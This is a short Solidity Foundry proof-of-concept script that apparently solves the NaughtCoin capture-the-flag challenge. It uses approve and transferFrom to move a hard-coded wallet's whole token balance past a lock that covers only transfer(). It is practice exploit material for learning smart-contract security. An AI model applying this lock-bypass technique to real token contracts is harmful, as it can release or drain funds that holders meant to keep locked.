// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./NaughtCoin.sol";

contract POC is Script {

    NaughtCoin naughtCoin = NaughtCoin(0x3212D0421E355a28150991E610d0e01fa7b7Cf66);

    function run() external{
        vm.startBroadcast();
        address myWallet = 0xEAce4b71CA1A128e8B562561f46896D55B9B0246;
        uint myBal = naughtCoin.balanceOf(myWallet);
        console.log("Current balance is: ", myBal);

        naughtCoin.approve(myWallet, myBal);
        naughtCoin.transferFrom(myWallet, address(naughtCoin), myBal);

        console.log("New balance is: ", naughtCoin.balanceOf(myWallet));
        vm.stopBroadcast();
    }
}